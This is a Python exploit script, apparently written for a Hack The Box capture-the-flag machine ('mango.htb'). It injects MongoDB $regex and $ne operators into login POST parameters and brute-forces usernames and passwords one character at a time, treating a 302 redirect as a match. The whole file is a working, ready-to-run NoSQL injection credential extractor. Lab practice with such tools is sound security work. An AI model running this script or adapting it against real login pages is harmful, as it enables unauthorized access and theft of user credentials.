import sys
import requests
import string
import time
import threading
def get_char():
    characters = string.printable
    for ch in string.printable:
        if ch in "$^&*|.+\?":
            characters = characters.replace(ch,"")
    return characters
def database(username,password):
    print("Username: "+username)
def method(url, para):
    return requests.post(url, data=para, allow_redirects=False)

def found(firstChar,username,password,type,rule):
    userpass = firstChar
    loop =True
    while loop:
        loop = False
        for char in get_char():
            payload = userpass + char
            para = {username + '[$regex]' : "^" + payload + ".*", password + '[$ne]' : '1' + type}
            r = method(url, para)
            if rule == "username":
                sys.stdout.write("Trying username: "+ payload +"\r")
            else:
                sys.stdout.write("Trying password: "+ payload +"\r")
            sys.stdout.flush()
            if r.status_code == 302:
                userpass = payload
                loop = True
                break
        
        
    return userpass

def main(url,username,password,type,rule):
    list_username = []
    list_password = []
    for firstChar in get_char():
        para = {username + "[$regex]" : "^" + firstChar + ".", password + "[$ne]" : "1" + type}
        r = method(url, para)
        if rule == "username":
            sys.stdout.write("Trying username: "+ firstChar +"\r")
        else:
            sys.stdout.write("Trying password: "+ firstChar +"\r")
        sys.stdout.flush()
        if r.status_code == 302:
            userpass = found(firstChar,username,password,type,rule)
            if rule == "username":
                list_username.append(userpass)
            else:
                list_password.append(userpass)
    if rule == "username":
        print("[+]Username Found:")
        print(list_username)
    else:
        print("[+]Password Found:")
        print(list_password)    



def classify(url,username,password,type,rule):
    if rule == "password":
        main(url,password,username,type,rule)
    else:
        main(url,username,password,type,rule)
if __name__ == "__main__":
    url = "http://staging-order.mango.htb/" ## Host target
    username = "username"
    password = "password"
    type = ",login:login"
    classify(url,username,password,type,"username")
    classify(url,username,password,type,"password")

    
    
    
    
